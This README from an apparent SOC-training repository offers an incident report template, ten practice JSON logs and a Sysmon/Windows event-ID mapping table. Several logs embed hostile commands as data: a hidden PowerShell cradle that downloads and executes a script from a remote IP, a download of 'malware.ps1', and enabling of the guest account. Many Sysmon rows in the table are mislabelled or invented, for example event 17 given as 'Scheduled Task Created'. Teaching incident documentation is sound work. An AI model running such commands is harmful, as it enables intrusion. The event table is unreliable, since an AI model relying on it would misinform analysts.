

# Incident Report Template & Sample Logs

This repository provides a **ready-to-use Incident Report template** along with **10 realistic sample logs** for practising SOC incident documentation.
Whether you’re learning incident response, threat hunting, or SOC workflows, this resource helps you write **clear, structured, and professional incident reports**.

---

## 📄 Incident Report Template

You can copy this template for your reports:

```
Incident Report: [Incident Title]
Date: [DD/MM/YYYY]
Time Detected: [HH:MM Timezone]
Analyst: [Analyst Name]
System: [System/Host Name]
Case ID: [Case ID]

Summary
On [DD/MM/YYYY] at [HH:MM Timezone], [brief description of incident] was detected on [system/host]. This suggests a potential [threat type].

Detection
Detected by: [tool or method, e.g., SIEM, EDR, or user report]  
Details: [key event details, e.g., alert type or log entry]

Investigation
Findings: [what was found, e.g., suspicious process, IP, or user activity]  
Impact: [what happened, e.g., blocked attempt or data accessed]  
Scope: [affected systems or spread, e.g., single host or network-wide]

Actions Taken
[Action 1, e.g., isolated system]  
[Action 2, e.g., blocked IP or updated firewall]  
[Action 3, e.g., created case in tracking system]

Recommendations
[Next step, e.g., scan system or reset passwords]  
[Prevention, e.g., patch system or train users]

Status
[Status, e.g., Open or Resolved]
```

---

## 📂 Sample Logs

Here are **10 logs** you can practise on:

```json
[
  {
    "timestamp": "2025-08-21T14:33:44.123Z",
    "log_source": "Sysmon",
    "event_id": 1,
    "process": "powershell.exe",
    "parent_process": "explorer.exe",
    "command_line": "powershell.exe -nop -w hidden -c \"IEX (New-Object Net.WebClient).DownloadString('http://217.156.122.82/update.ps1')\"",
    "user": "CORP\\alice",
    "host": "CORP-WIN10",
    "host_ip": "192.168.10.7",
    "process_id": 3456
  },
  {
    "timestamp": "2025-08-21T14:33:45.456Z",
    "log_source": "Sysmon",
    "event_id": 3,
    "source_ip": "192.168.10.7",
    "destination_ip": "217.156.122.82",
    "port": 80,
    "protocol": "TCP",
    "process": "powershell.exe",
    "host": "CORP-WIN10"
  },
  {
    "timestamp": "2025-08-21T09:15:22.101Z",
    "log_source": "Windows Event Log",
    "event_id": 4624,
    "user": "CORP\\bob",
    "logon_type": "Interactive",
    "host": "CORP-WIN11",
    "host_ip": "192.168.10.12",
    "details": "Successful logon"
  },
  {
    "timestamp": "2025-08-21T09:16:30.234Z",
    "log_source": "Sysmon",
    "event_id": 1,
    "process": "cmd.exe",
    "parent_process": "explorer.exe",
    "command_line": "cmd.exe /c net user guest /active:yes",
    "user": "CORP\\bob",
    "host": "CORP-WIN11",
    "host_ip": "192.168.10.12",
    "process_id": 1289
  },
  {
    "timestamp": "2025-08-21T09:17:05.567Z",
    "log_source": "Firewall",
    "event_type": "Connection Attempt",
    "source_ip": "192.168.10.12",
    "destination_ip": "45.33.22.11",
    "port": 445,
    "protocol": "TCP",
    "status": "Blocked",
    "host": "CORP-WIN11"
  },
  {
    "timestamp": "2025-08-21T11:22:10.890Z",
    "log_source": "Sysmon",
    "event_id": 7,
    "process": "svchost.exe",
    "image_loaded": "C:\\Windows\\Temp\\suspicious.dll",
    "hash": "a1b2c3d4e5f67890a1b2c3d4e5f67890a1b2c3d4e5f67890a1b2c3d4e5f67890",
    "user": "NT AUTHORITY\\SYSTEM",
    "host": "CORP-SRV01",
    "host_ip": "192.168.10.50"
  },
  {
    "timestamp": "2025-08-21T11:23:15.321Z",
    "log_source": "EDR",
    "alert_type": "Suspicious Module Load",
    "details": "Unknown DLL loaded by svchost.exe from C:\\Windows\\Temp\\suspicious.dll",
    "hash": "a1b2c3d4e5f67890a1b2c3d4e5f67890a1b2c3d4e5f67890a1b2c3d4e5f67890",
    "host": "CORP-SRV01",
    "user": "NT AUTHORITY\\SYSTEM"
  },
  {
    "timestamp": "2025-08-21T13:45:50.654Z",
    "log_source": "Sysmon",
    "event_id": 3,
    "source_ip": "192.168.10.15",
    "destination_ip": "198.51.100.99",
    "port": 3389,
    "protocol": "TCP",
    "process": "mstsc.exe",
    "user": "CORP\\charlie",
    "host": "CORP-WIN10-02"
  },
  {
    "timestamp": "2025-08-21T13:46:00.987Z",
    "log_source": "Windows Event Log",
    "event_id": 4625,
    "user": "CORP\\charlie",
    "logon_type": "RemoteInteractive",
    "host": "CORP-DC01",
    "host_ip": "192.168.10.5",
    "details": "Failed logon attempt from 192.168.10.15"
  },
  {
    "timestamp": "2025-08-21T15:00:12.321Z",
    "log_source": "Sysmon",
    "event_id": 1,
    "process": "powershell.exe",
    "parent_process": "explorer.exe",
    "command_line": "powershell.exe -nop -w hidden -c \"Invoke-WebRequest http://198.51.100.50/malware.ps1 -OutFile C:\\Temp\\malware.ps1\"",
    "user": "CORP\\dave",
    "host": "CORP-WIN12",
    "host_ip": "192.168.10.20",
    "process_id": 4096
  }
]
```

---

## 🔑 Common Event ID Mappings

| Event ID | Event Source      | Threat Type / Description                               | Suggested Response                                                                |
| -------- | ----------------- | ------------------------------------------------------- | --------------------------------------------------------------------------------- |
| 1        | Sysmon            | Process Creation – Suspicious command or malware launch | Investigate process, check parent process, capture IOC, isolate host if malicious |
| 3        | Sysmon            | Network Connection – Potential C2 or data exfiltration  | Verify destination IP/port, block if malicious, check process and logs            |
| 4        | Sysmon       | Sysmon Registry Event                                   | Validate registry changes, check for persistence mechanisms                       |
| 5        | Sysmon       | Process Termination                                     | Investigate abnormal process lifecycle, check for malware                         |
| 6        | Sysmon       | Driver Loaded                                           | Verify driver source, validate hash, scan for rootkits                            |
| 7        | Sysmon       | Image Loaded – Suspicious DLL / malware persistence     | Validate hash, scan host, monitor process, consider quarantine                    |
| 8        | Sysmon       | CreateRemoteThread – Potential Code Injection           | Investigate source process, monitor target process                                |
| 9        | Sysmon       | RawAccessRead – Potential Credential Dumping            | Check for Mimikatz or similar tools, review process behavior                      |
| 10       | Sysmon       | ProcessAccess – Potential Lateral Movement              | Monitor for abnormal process interactions, investigate source and target          |
| 11       | Sysmon       | FileCreate – Potential Malware Dropping                 | Scan new files, validate hashes, isolate host if suspicious                       |
| 12       | Sysmon       | RegistryEvent – Suspicious Key Modification             | Investigate for persistence or configuration tampering                            |
| 13       | Sysmon       | RegistryValueSet – Potential Persistence Attempt        | Verify registry changes, monitor affected processes                               |
| 14       | Sysmon       | FileCreateStreamHash – Suspicious Alternate Data Stream | Check file for malware, validate hash, investigate source process                 |
| 15       | Sysmon       | FileDelete – Possible Malicious Cleanup                 | Investigate deleted files, restore if critical, check for malware                 |
| 16       | Sysmon       | ClipboardChange – Potential Data Theft                  | Monitor for unusual clipboard activity, investigate user and process              |
| 17       | Sysmon       | Scheduled Task Created                                  | Check task details, validate creator, monitor for persistence                     |
| 18       | Sysmon       | Scheduled Task Modified                                 | Review modifications, validate legitimacy, monitor task                           |
| 19       | Sysmon       | WMI Event Filter Created                                | Check for persistence or malware activity via WMI                                 |
| 20       | Sysmon       | WMI Event Filter Modified                               | Review modifications, verify authorized changes                                   |
| 21       | Sysmon       | WMI Event Consumer Created                              | Investigate for persistence, check associated processes                           |
| 22       | Sysmon       | DNS Query – Potential C2 or Data Exfiltration           | Validate domain, check destination IP, block if malicious                         |
| 23       | Sysmon       | FileDeleteDetected – Suspicious File Deletion           | Investigate deleted files, validate integrity, check for malware                  |
| 24       | Sysmon       | ClipboardChangeDetected – Sensitive Data Exfiltration   | Review user/process activity, alert if sensitive data involved                    |
| 25       | Sysmon       | ProcessTamperingDetected                                | Investigate target process, check for malware or exploitation                     |
| 26       | Sysmon       | FilePermissionChange                                    | Verify legitimate permissions changes, monitor for malware persistence            |
| 27       | Sysmon       | NamedPipeEvent                                          | Check for suspicious IPC communication, validate source processes                 |
| 28       | Sysmon       | NetworkShareAccess – Potential Lateral Movement         | Investigate accessing host, check credentials, monitor activity                   |
| 29       | Sysmon       | FileStreamModification                                  | Validate modified files, scan for malware, track changes                          |
| 4624     | Windows Event Log | Successful Logon                                        | Verify user, check for anomalies, ensure proper access                            |
| 4625     | Windows Event Log | Failed Logon Attempt                                    | Check for brute-force attempts, review account lockout policies                   |
| 4688     | Windows Event Log | Process Creation                                        | Validate process chain, detect suspicious commands                                |
| 4689     | Windows Event Log | Process Termination                                     | Track abnormal process lifecycles for anomalies                                   |
| 4648     | Windows Event Log | Logon with Explicit Credentials                         | Investigate for lateral movement or misuse                                        |
| 5156     | Windows Firewall  | Network Connection Allowed                              | Check unexpected outgoing connections                                             |
| 5158     | Windows Firewall  | Network Connection Blocked                              | Ensure blocked malicious connections are noted                                    |


---

## 💡 How to Practise

1. Pick a log from the sample set.
2. Fill in the Incident Report template for that log.
3. Use the **Event ID mapping table** to guide your analysis and suggested response.
4. Repeat with multiple logs to simulate real SOC incident scenarios.

> Practising consistently will help you **document incidents clearly, professionally, and efficiently**, just like a real SOC analyst.


